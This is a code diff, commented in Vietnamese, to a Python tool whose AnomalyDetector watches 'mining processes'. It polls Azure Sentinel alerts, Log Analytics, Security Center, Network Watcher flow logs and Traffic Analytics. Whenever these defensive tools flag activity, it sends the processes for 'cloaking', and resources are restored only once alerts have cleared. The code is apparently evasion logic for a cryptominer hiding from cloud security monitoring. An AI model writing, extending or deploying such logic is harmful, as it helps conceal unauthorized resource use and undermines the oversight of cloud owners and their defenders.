@@ -102,7 +102,6 @@ class SafeRestoreEvaluator:
 
             # 7) Kiểm tra sử dụng Disk I/O
             disk_io_counters = psutil.disk_io_counters()
-            # Đảm bảo biểu thức + / được bao trong ngoặc
             total_disk_io_usage_mbps = (
                 (disk_io_counters.read_bytes + disk_io_counters.write_bytes)
                 / (1024 * 1024)
@@ -126,29 +125,24 @@ class SafeRestoreEvaluator:
                 return False
 
             # 9) Kiểm tra cảnh báo từ Azure Sentinel
-            alerts = self.resource_manager.azure_sentinel_client.get_recent_alerts(days=1)
+            alerts = self.resource_manager.azure_sentinel_client.get_recent_alerts(days=2)
             if isinstance(alerts, list) and len(alerts) > 0:
                 self.logger.info(
                     f"Vẫn còn {len(alerts)} cảnh báo từ Azure Sentinel."
                 )
                 return False
 
-            # 10) Kiểm tra logs từ Azure Log Analytics
-            for vm in self.resource_manager.vms:
-                query = (
-                    "Heartbeat | where Computer == '{0}' "
-                    "| summarize AggregatedValue = avg(CPUUsage) by bin(TimeGenerated, 5m)"
-                ).format(vm['name'])
-                logs = self.resource_manager.azure_log_analytics_client.query_logs(query)
-                # [CHANGES] Kiểm tra logs là list
-                if isinstance(logs, list) and len(logs) > 0:
-                    self.logger.info(
-                        f"Vẫn còn logs bất thường từ Azure Log Analytics cho VM {vm['name']}."
-                    )
-                    return False
+            # 10) Kiểm tra logs từ Azure Log Analytics (dành cho AML logs nói chung)
+
+            logs = self.resource_manager.azure_log_analytics_client.query_aml_logs(days=2)
+            if isinstance(logs, list) and len(logs) > 0:
+                self.logger.info(
+                    "Phát hiện logs AML (AzureDiagnostics) => dừng khôi phục tài nguyên."
+                )
+                return False
 
             # 11) Kiểm tra khuyến nghị từ Azure Security Center
-            recommendations = self.resource_manager.azure_security_center_client.recommendations.list_by_subscription()
+            recommendations = self.resource_manager.azure_security_center_client.get_secure_scores()
             if isinstance(recommendations, list) and len(recommendations) > 0:
                 self.logger.info(
                     f"Vẫn còn {len(recommendations)} khuyến nghị bảo mật từ Azure Security Center."
@@ -157,10 +151,9 @@ class SafeRestoreEvaluator:
 
             # 12) Kiểm tra lưu lượng từ Azure Traffic Analytics
             traffic_data = self.resource_manager.azure_traffic_analytics_client.get_traffic_data()
-            if traffic_data:  # traffic_data thường là list hoặc dict
-                # Nếu là list, check len(); nếu là dict, check số key
+            if traffic_data:
                 if (isinstance(traffic_data, list) and len(traffic_data) > 0) \
-                   or (isinstance(traffic_data, dict) and len(traffic_data.keys()) > 0):
+                or (isinstance(traffic_data, dict) and len(traffic_data.keys()) > 0):
                     self.logger.info("Vẫn còn lưu lượng bất thường từ Azure Traffic Analytics.")
                     return False
 
@@ -295,6 +288,9 @@ class AnomalyDetector(BaseManager):
         return priority
 
     def anomaly_detection(self):
+        """
+        Phát hiện bất thường trong các tiến trình khai thác và thực hiện cloaking nếu cần.
+        """
         detection_interval = self.config.get("monitoring_parameters", {}).get("detection_interval_seconds", 60)
         cloak_activation_delay = self.config.get("monitoring_parameters", {}).get("cloak_activation_delay_seconds", 5)
         last_detection_time = 0
@@ -302,6 +298,7 @@ class AnomalyDetector(BaseManager):
         while not self.stop_event.is_set():
             current_time = time()
 
+            # Chỉ chạy nếu đã đủ thời gian giữa hai lần kiểm tra
             if current_time - last_detection_time < detection_interval:
                 sleep(1)
                 continue
@@ -317,7 +314,10 @@ class AnomalyDetector(BaseManager):
 
                 with self.mining_processes_lock:
                     for process in self.mining_processes:
+                        # Cập nhật tài nguyên sử dụng của tiến trình
                         process.update_resource_usage()
+
+                        # 1) Phát hiện bất thường qua Azure Anomaly Detector
                         current_state = self.resource_manager.collect_metrics(process)
                         anomalies_detected = self.resource_manager.azure_anomaly_detector_client.detect_anomalies(current_state)
 
@@ -331,8 +331,8 @@ class AnomalyDetector(BaseManager):
                             process.is_cloaked = True
                             continue
 
-                        # Kiểm tra alerts từ Azure Sentinel
-                        alerts = self.resource_manager.azure_sentinel_client.get_recent_alerts(days=1)
+                        # 2) Kiểm tra alerts từ Azure Sentinel
+                        alerts = self.resource_manager.azure_sentinel_client.get_recent_alerts(days=2)
                         if isinstance(alerts, list) and len(alerts) > 0:
                             self.logger.warning(
                                 f"Detected {len(alerts)} alerts from Azure Sentinel for PID: {process.pid}"
@@ -341,23 +341,18 @@ class AnomalyDetector(BaseManager):
                             process.is_cloaked = True
                             continue
 
-                        # Kiểm tra logs từ Azure Log Analytics
-                        for vm in self.resource_manager.vms:
-                            query = (
-                                "Heartbeat | where Computer == '{0}' "
-                                "| summarize AggregatedValue = avg(CPUUsage) by bin(TimeGenerated, 5m)"
-                            ).format(vm['name'])
-                            logs = self.resource_manager.azure_log_analytics_client.query_logs(query)
-                            if isinstance(logs, list) and len(logs) > 0:
-                                self.logger.warning(
-                                    f"Detected logs từ Azure Log Analytics cho VM {vm['name']}."
-                                )
-                                self.resource_manager.cloaking_request_queue.put(process)
-                                process.is_cloaked = True
-                                break
+                        # 3) Kiểm tra AML logs từ Azure Log Analytics (THAY ĐỔI Ở ĐÂY)
+                        aml_logs = self.resource_manager.azure_log_analytics_client.query_aml_logs(days=2)
+                        if isinstance(aml_logs, list) and len(aml_logs) > 0:
+                            self.logger.warning(
+                                f"Detected AML logs từ AzureDiagnostics => Cloaking process {process.name} (PID={process.pid})."
+                            )
+                            self.resource_manager.cloaking_request_queue.put(process)
+                            process.is_cloaked = True
+                            continue
 
-                        # Kiểm tra recommendations từ Azure Security Center
-                        recommendations = self.resource_manager.azure_security_center_client.recommendations.list_by_subscription()
+                        # 4) Kiểm tra recommendations từ Azure Security Center
+                        recommendations = self.resource_manager.azure_security_center_client.get_secure_scores()
                         if isinstance(recommendations, list) and len(recommendations) > 0:
                             self.logger.warning(
                                 f"Detected {len(recommendations)} security recommendations từ Azure Security Center."
@@ -366,7 +361,7 @@ class AnomalyDetector(BaseManager):
                             process.is_cloaked = True
                             continue
 
-                        # Kiểm tra flow logs từ Azure Network Watcher
+                        # 5) Kiểm tra flow logs từ Azure Network Watcher
                         for nsg in self.resource_manager.nsgs:
                             flow_logs = self.resource_manager.azure_network_watcher_client.get_flow_logs(
                                 resource_group=nsg['resourceGroup'],
@@ -379,7 +374,7 @@ class AnomalyDetector(BaseManager):
                             )
                             if flow_logs:
                                 if (isinstance(flow_logs, list) and len(flow_logs) > 0) \
-                                   or (isinstance(flow_logs, dict) and len(flow_logs.keys()) > 0):
+                                or (isinstance(flow_logs, dict) and len(flow_logs.keys()) > 0):
                                     self.logger.warning(
                                         f"Detected flow logs từ Azure Network Watcher cho NSG {nsg['name']}."
                                     )
@@ -387,18 +382,18 @@ class AnomalyDetector(BaseManager):
                                     process.is_cloaked = True
                                     break
 
-                        # Kiểm tra traffic từ Azure Traffic Analytics
+                        # 6) Kiểm tra traffic từ Azure Traffic Analytics
                         traffic_data = self.resource_manager.azure_traffic_analytics_client.get_traffic_data()
                         if traffic_data:
                             if (isinstance(traffic_data, list) and len(traffic_data) > 0) \
-                               or (isinstance(traffic_data, dict) and len(traffic_data.keys()) > 0):
+                            or (isinstance(traffic_data, dict) and len(traffic_data.keys()) > 0):
                                 self.logger.warning(
                                     f"Detected traffic anomalies từ Azure Traffic Analytics cho PID: {process.pid}"
                                 )
                                 self.resource_manager.cloaking_request_queue.put(process)
                                 process.is_cloaked = True
                                 continue
-                            
+
             except Exception as e:
                 self.logger.error(f"Error in anomaly_detection: {e}")
 
